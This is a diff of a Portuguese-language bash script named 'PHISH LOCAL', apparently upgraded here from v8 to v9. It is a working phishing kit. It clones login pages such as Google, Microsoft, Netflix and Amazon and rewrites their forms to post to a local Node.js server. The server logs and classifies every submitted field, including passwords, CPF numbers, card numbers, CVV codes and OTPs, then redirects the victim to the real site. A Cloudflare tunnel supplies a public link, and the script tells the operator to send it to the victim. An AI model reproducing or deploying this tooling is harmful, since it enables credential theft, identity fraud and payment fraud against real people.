@@ -1,8 +1,8 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISH LOCAL v8 - Cloudflare Tunnel
-# Clona QUALQUER site | Link publico gratis
-# Sem root | Sem instalar nada | Sem registro
+# 🎣 PHISH LOCAL v9 - Universal Wordlist
+# Captura QUALQUER campo de QUALQUER site
+# Cloudflare Tunnel | Sem root | Sem login
 # ============================================
 
 SITE_DIR="site_clone"
@@ -12,15 +12,97 @@ mkdir -p "$SITE_DIR" server
 
 # Verificar node
 if ! command -v node &>/dev/null; then
-    echo "[!] Node.js nao encontrado."
-    echo "    Rode: pkg install nodejs -y"
+    echo "[!] Node.js nao encontrado. Rode: pkg install nodejs -y"
     exit 1
 fi
 
+# =============================================
+# WORDLIST - Nomes comuns de campos de login
+# =============================================
+WORDLIST=(
+    # Login/Entrar
+    "login" "signin" "sign_in" "log_in" "entrar" "acessar" "acesso"
+    "sign-in" "log-in" "singin" "sing_in" "iniciar_sessao" "iniciar"
+    "cadastrar" "cadastro" "registrar" "registro" "criar_conta"
+    "create_account" "subscribe" "inscricao"
+
+    # Usuário/Email/Telefone
+    "username" "user_name" "user-name" "usuario" "nome" "name"
+    "email" "e-mail" "mail" "telefone" "phone" "telemovel" "celular"
+    "cpf" "cnpj" "documento" "rg" "identificacao" "matricula"
+    "identification" "identifier" "login_id" "loginid" "userid"
+    "user" "uname" "nick" "nickname" "login_email" "login_phone"
+    "mobile" "cellphone" "contact" "username_email" "email_phone"
+
+    # Senha
+    "password" "senha" "pass" "passwd" "pass_word" "pwd"
+    "palavra_pave" "palavra_chave" "chave" "secret" "secret_password"
+    "new_password" "new_password" "nova_senha" "confirm_password"
+    "confirm_senha" "confirmar_senha" "confirmar" "confirmation"
+
+    # Nome completo / Dados pessoais
+    "fullname" "full_name" "nome_completo" "nome_real" "real_name"
+    "firstname" "first_name" "nome" "sobrenome" "lastname" "last_name"
+    "social_name" "razao_social" "nome_mae" "nome_pai"
+    "birthdate" "data_nascimento" "nascimento" "birth_date" "dob"
+    "genero" "sexo" "gender" "estado_civil"
+
+    # Endereço
+    "endereco" "address" "rua" "street" "cidade" "city"
+    "estado" "state" "cep" "zip" "zipcode" "postal_code"
+    "bairro" "neighborhood" "pais" "country" "complemento"
+
+    # Trabalho/Escola
+    "empresa" "company" "trabalho" "work" "profissao" "occupation"
+    "escola" "school" "universidade" "university" "curso" "course"
+    "departamento" "department" "setor" "cargo" "position"
+    "matricula" "student_id" "ra" "registration"
+
+    # Segurança/Verificação
+    "codigo" "code" "token" "otp" "pin" "verification_code"
+    "codigo_verificacao" "codigo_seguranca" "security_code"
+    "captcha" "2fa" "two_factor" "autenticacao" "auth"
+    "pergunta_secreta" "secret_question" "resposta" "answer"
+
+    # Pagamento
+    "cartao" "card" "credit_card" "cartao_credito" "cc_number"
+    "cvv" "validade" "expiry" "expiration_date" "card_holder"
+    "conta" "account" "banco" "bank" "agencia" "agency"
+    "pix" "chave_pix" "bank_account"
+
+    # Preferências
+    "linguagem" "language" "timezone" "fuso_horario"
+    "notificacao" "notification" "newsletter" "aceito_termos"
+    "termos" "terms" "privacidade" "privacy" "aceitar"
+    "remember" "lembrar" "remember_me" "manter_conectado"
+
+    # Campos genéricos
+    "campo" "field" "input" "valor" "value" "dado" "data"
+    "descricao" "description" "titulo" "title" "assunto" "subject"
+    "mensagem" "message" "comentario" "comment" "observacao"
+    "anexo" "file" "arquivo" "upload" "imagem" "photo"
+    "url" "link" "website" "dominio"
+    "data" "date" "hora" "time" "periodo" "ano" "mes" "dia"
+    "quantidade" "quantity" "qtd" "numero" "number"
+    "tipo" "type" "categoria" "category" "status"
+    "acao" "action" "operacao" "operation"
+    "id" "uuid" "chave" "key" "hash"
+)
+
+# Converter wordlist para JSON para passar ao Node.js
+WORDLIST_JSON="["
+for w in "${WORDLIST[@]}"; do
+    WORDLIST_JSON+="\"$w\","
+done
+WORDLIST_JSON="${WORDLIST_JSON%,}]"
+
+# =============================================
+# MENU PRINCIPAL
+# =============================================
 clear
 echo ""
 echo "=========================================="
-echo "     PHISH LOCAL v8 - Cloudflare Tunnel"
+echo "     PHISH LOCAL v9 - Universal Wordlist"
 echo "=========================================="
 echo ""
 echo "  1) Criar phishing"
@@ -46,6 +128,7 @@ echo "  - https://accounts.google.com"
 echo "  - https://login.live.com"
 echo "  - https://twitter.com/i/flow/login"
 echo "  - https://www.netflix.com/login"
+echo "  - https://www.amazon.com/ap/signin"
 echo "  - OU QUALQUER outro site de login"
 echo ""
 echo -n "URL do site: "
@@ -91,7 +174,7 @@ if [ ! -f "$SITE_DIR/index.html" ] || [ $(wc -c < "$SITE_DIR/index.html") -lt 10
     touch "$SITE_DIR/index.html"
 fi
 
-echo "[...] Baixando CSS..."
+echo "[...] Baixando recursos..."
 for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//'); do
     fname=$(basename "$css")
     [ -f "$SITE_DIR/$fname" ] && continue
@@ -103,7 +186,6 @@ for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | s
     fi
 done
 
-echo "[...] Baixando JS..."
 for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
     fname=$(basename "$js")
     [ -f "$SITE_DIR/$fname" ] && continue
@@ -115,7 +197,6 @@ for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 
     fi
 done
 
-echo "[...] Baixando imagens..."
 for img in $(grep -oE 'src="[^"]*\.(png|jpg|jpeg|gif|svg|webp)"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
     fname=$(basename "$img")
     [ -f "$SITE_DIR/$fname" ] && continue
@@ -127,32 +208,83 @@ for img in $(grep -oE 'src="[^"]*\.(png|jpg|jpeg|gif|svg|webp)"' "$SITE_DIR/inde
     fi
 done
 
-echo "[...] Configurando captura..."
+echo "[...] Configurando captura com wordlist..."
+# Modificar formularios
 sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
 sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"
 
 echo ""
 echo "[OK] Site clonado!"
-ls "$SITE_DIR"/*.html "$SITE_DIR"/*.css 2>/dev/null | head -5
 
 # --- CRIAR SERVIDOR ---
-cat > "$SERVER_FILE" << 'EOF'
+cat > "$SERVER_FILE" << EOF
 const http=require('http'),fs=require('fs'),path=require('path');
-const PORT=process.env.PORT||8080;
-const SITE_DIR=process.env.SITE_DIR||'site_clone';
-const LOG_FILE=process.env.LOG_FILE||'capturas.txt';
-const REDIRECT=process.env.REDIRECT||'https://instagram.com';
+const PORT=${PORT};
+const SITE_DIR="${SITE_DIR}";
+const LOG_FILE="${LOG_FILE}";
+const REDIRECT="${REDIRECT_URL}";
+const LOCAL_NAME="${LOCAL_NAME}";
+const TARGET="${TARGET_URL}";
+
+const WORDLIST=${WORDLIST_JSON};
+
 const MIME={'.html':'text/html','.css':'text/css','.js':'application/javascript','.png':'image/png','.jpg':'image/jpeg','.jpeg':'image/jpeg','.gif':'image/gif','.svg':'image/svg+xml','.ico':'image/x-icon','.webp':'image/webp','.woff':'font/woff','.woff2':'font/woff2','.ttf':'font/ttf','.json':'application/json'};
 
-function saveCapture(body,ip){
+function classifyField(name) {
+    name = (name || '').toLowerCase().replace(/[^a-z0-9_]/g, '');
+    for (const w of WORDLIST) {
+        if (name.includes(w) || w.includes(name)) {
+            if (['login','signin','sign_in','log_in','entrar','acessar','iniciar','cadastrar','registrar','username','user','email','e-mail','telefone','phone','cpf','cnpj','matricula','identifier','userid'].some(x => w.includes(x) || x.includes(w))) return 'USUARIO';
+            if (['password','senha','pass','passwd','pwd','palavra','chave','secret','pin','codigo'].some(x => w.includes(x) || x.includes(w))) return 'SENHA';
+            if (['nome','name','fullname','firstname','lastname','sobrenome','social_name','razao_social','mae','pai'].some(x => w.includes(x) || x.includes(w))) return 'NOME';
+            if (['data','date','nascimento','birth','birthdate','ano','mes','dia'].some(x => w.includes(x) || x.includes(w))) return 'DATA';
+            if (['endereco','address','rua','cidade','estado','cep','zip','bairro','pais','complemento'].some(x => w.includes(x) || x.includes(w))) return 'ENDERECO';
+            if (['empresa','company','trabalho','profissao','escola','universidade','curso','departamento','cargo','matricula'].some(x => w.includes(x) || x.includes(w))) return 'TRABALHO_ESCOLA';
+            if (['cartao','card','credit_card','cvv','validade','conta','banco','agencia','pix'].some(x => w.includes(x) || x.includes(w))) return 'PAGAMENTO';
+            if (['token','otp','verification','captcha','2fa','auth','pergunta','resposta'].some(x => w.includes(x) || x.includes(w))) return 'SEGURANCA';
+            if (['termos','terms','privacidade','privacy','aceitar','remember','newsletter'].some(x => w.includes(x) || x.includes(w))) return 'PREFERENCIA';
+            return 'EXTRA';
+        }
+    }
+    return 'OUTRO';
+}
+
+function saveCapture(body, ip, headers){
     try{
         const p=new URLSearchParams(body);
-        const d={};
-        for(let[k,v]of p.entries())d[k]=v;
+        const allFields={};
+        const classified={USUARIO:[],SENHA:[],NOME:[],DATA:[],ENDERECO:[],TRABALHO_ESCOLA:[],PAGAMENTO:[],SEGURANCA:[],PREFERENCIA:[],EXTRA:[],OUTRO:[]};
+
+        for(let[k,v]of p.entries()){
+            allFields[k]=v;
+            const cat=classifyField(k);
+            classified[cat].push(k+': '+v);
+        }
+
         const ts=new Date().toISOString().replace('T',' ').split('.')[0];
-        const log='['+ts+'] IP:'+ip+' '+JSON.stringify(d);
-        fs.appendFileSync(LOG_FILE,log+'\n');
-        console.log('\n[CAPTURADO] '+log);
+        const logEntry={
+            timestamp:ts,
+            ip:ip,
+            target:TARGET,
+            local:LOCAL_NAME,
+            fields:allFields,
+            classified:classified
+        };
+
+        // Salvar em arquivo
+        fs.appendFileSync(LOG_FILE, JSON.stringify(logEntry)+'\n');
+
+        // Mostrar bonito no terminal
+        console.log('\n'+'='.repeat(50));
+        console.log('  CAPTURADO - '+ts);
+        console.log('  IP: '+ip);
+        console.log('='.repeat(50));
+        for(const[cat,vals]of Object.entries(classified)){
+            if(vals.length>0){
+                console.log('  ['+cat+'] '+vals.join(' | '));
+            }
+        }
+        console.log('='.repeat(50)+'\n');
     }catch(e){}
 }
 
@@ -162,7 +294,7 @@ http.createServer((req,res)=>{
         let b='';
         req.on('data',c=>b+=c);
         req.on('end',()=>{
-            saveCapture(b,ip);
+            saveCapture(b,ip,req.headers);
             res.writeHead(302,{'Location':REDIRECT});
             res.end();
         });
@@ -174,7 +306,7 @@ http.createServer((req,res)=>{
     fs.readFile(f,(er,d)=>{
         if(er){
             res.writeHead(200,{'Content-Type':'text/html'});
-            res.end('<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">\n<meta name="viewport" content="width=device-width,initial-scale=1.0">\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{font-family:-apple_system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}\n.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}\nh1{font-size:44px;font-weight:300;margin-bottom:30px;font-family:"Segoe UI",sans-serif}\ninput{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}\ninput:focus{border-color:#a8a8a8}\nbutton{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}\nbutton:active{background:#1877f2}\n</style></head><body>\n<div class="card"><h1>Login</h1>\n<form method="POST"action="/login">\n<input type="text" name="username" placeholder="Usuario ou email" required>\n<input type="password" name="password" placeholder="Senha" required>\n<button type="submit">Entrar</button>\n</form></div></body></html>');
+            res.end('<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">\n<meta name="viewport" content="width=device-width,initial-scale=1.0">\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{font-family:-apple-system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}\n.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}\nh1{font-size:44px;font-weight:300;margin-bottom:30px}\ninput{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}\ninput:focus{border-color:#a8a8a8}\nbutton{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}\nbutton:active{background:#1877f2}\n</style></head><body>\n<div class="card"><h1>Login</h1>\n<form method="POST"action="/login">\n<input type="text" name="username" placeholder="Usuario ou email" required>\n<input type="password" name="password" placeholder="Senha" required>\n<button type="submit">Entrar</button>\n</form></div></body></html>');
             return;
         }
         res.writeHead(200,{'Content-Type':MIME[ext]||'application/octet-stream'});
@@ -183,7 +315,7 @@ http.createServer((req,res)=>{
 }).listen(PORT,'0.0.0.0',()=>console.log('Servidor ativo porta '+PORT));
 EOF
 
-# --- OBTER IP LOCAL ---
+# --- OBTER IP ---
 IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
 [ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
 [ -z "$IP" ] && IP="127.0.0.1"
@@ -239,18 +371,15 @@ if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ]; then
     echo "[...] Criando tunnel..."
     echo ""
 
-    # Rodar cloudflared em background e capturar URL
     cloudflared tunnel --url "http://localhost:$PORT" > /tmp/cf_tunnel.log 2>&1 &
     CF_PID=$!
 
-    # Esperar a URL aparecer
     sleep 5
     CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log | head -1)
 
     if [ -n "$CF_URL" ]; then
         echo "[OK] Tunnel criado!"
     else
-        echo "[AVISO] Aguardando tunnel..."
         sleep 5
         CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log | head -1)
     fi
@@ -272,7 +401,6 @@ if [ -n "$CF_URL" ]; then
     echo ""
     echo "  Mande esse link pra pessoa!"
     echo "  Ela acessa de QUALQUER lugar do mundo."
-    echo "  Sem instalar nada, sem registro."
 else
     echo "  Acesse de qualquer dispositivo na mesma rede:"
     echo "  http://${IP}:${PORT}"
@@ -285,7 +413,6 @@ echo ""
 
 REDIRECT="$REDIRECT_URL" PORT="$PORT" node "$SERVER_FILE"
 
-# Parar cloudflared se estiver rodando
 [ -n "$CF_PID" ] && kill $CF_PID 2>/dev/null
 
 echo ""
@@ -298,6 +425,7 @@ if [ "$V" = "s" ] || [ "$V" = "S" ]; then
     if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
         echo "=========================================="
         cat "$LOG_FILE"
+        echo ""
         echo "=========================================="
     else
         echo "Nenhuma captura."
@@ -309,6 +437,7 @@ elif [ "$MENU" = "2" ]; then
     if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
         echo "=========================================="
         cat "$LOG_FILE"
+        echo ""
         echo "=========================================="
     else
         echo "Nenhuma captura."
